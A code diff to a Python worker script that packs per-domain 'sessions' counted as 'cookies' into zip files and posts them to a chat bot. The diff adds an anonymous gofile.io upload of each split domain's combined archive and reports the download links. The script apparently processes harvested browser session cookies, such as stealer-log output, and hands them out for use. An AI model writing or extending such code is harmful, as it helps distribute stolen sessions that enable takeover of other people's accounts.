@@ -627,13 +627,41 @@ def pack_domain(dom, sessions_, hdr):
             cur.close(); cur = None
     if cur:
         cur.close()
+    if part > 1:
+        full = OUT / ("%s.full.zip" % base)
+        with zipfile.ZipFile(full, "w", zipfile.ZIP_DEFLATED) as z:
+            for i, session_lines in enumerate(sessions_, 1):
+                z.writestr("%d.txt" % i, hdr + "\n".join(session_lines) + "\n")
+
+def gofile(path):
+    """Anonymous gofile.io upload; returns the download page for a full zip."""
+    try:
+        srv = (requests.get("https://api.gofile.io/servers", timeout=30).json()
+               .get("data", {}).get("servers") or [])
+    except Exception as e:
+        sys.stdout.write("gofile servers: %s\n" % e); return None
+    for s in srv[:3]:
+        try:
+            with open(path, "rb") as fh:
+                r = requests.post("https://%s.gofile.io/contents/uploadfile"
+                                  % s.get("name"),
+                                  files={"file": (os.path.basename(path), fh)},
+                                  timeout=1800)
+            d = r.json()
+            if d.get("status") == "ok":
+                return (d.get("data") or {}).get("downloadPage")
+            sys.stdout.write("gofile %s: %s\n" % (s.get("name"), str(d)[:160]))
+        except Exception as e:
+            sys.stdout.write("gofile %s error: %s\n" % (s.get("name"), e))
+    return None
 
 SPECS = {}
 Q = queue.Queue()
 
 def deliver(packed, task):
-    """Post every domain zip (and each part of a split domain) to the chat."""
-    sent, failed = [], []
+    """Post every domain zip (and each part of a split domain) to the chat.
+    A domain that had to be split also gets its combined zip on gofile."""
+    sent, failed, links = [], [], {}
     for dom, cnt in (packed or {}).items():
         base = re.sub(r"[^\w.-]", "_", dom.lower())
         parts = sorted(p for p in OUT.glob(base + "*.zip")
@@ -656,7 +684,15 @@ def deliver(packed, task):
             if not upload(str(zp), cap):
                 ok_all = False
         (sent if ok_all else failed).append(dom)
-    return sent, failed
+        if len(parts) > 1:
+            full = OUT / ("%s.full.zip" % base)
+            if full.exists():
+                url = gofile(str(full))
+                if url:
+                    links[dom] = url
+                else:
+                    sys.stdout.write("full-zip link failed for %s\n" % dom)
+    return sent, failed, links
 
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
@@ -665,7 +701,8 @@ def finish(task, stage, **extra):
        **{k: extra[k] for k in extra if k in ("err", "tried")})
     payload = {"job": task.get("job"), "stage": stage, "uid": task.get("chat")}
     payload.update({k: extra[k] for k in extra
-                    if k in ("err", "found", "cookies", "tried", "sent", "failed")})
+                    if k in ("err", "found", "cookies", "tried", "sent", "failed",
+                             "links")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
@@ -705,11 +742,11 @@ def process(task):
     if stop():
         shutil.rmtree(WORK, ignore_errors=True)
         finish(task, "cancelled", err="cancelled"); return
-    sent, failed = deliver(packed, task)
+    sent, failed, links = deliver(packed, task)
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
     finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
-           failed=failed)
+           failed=failed, links=links)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
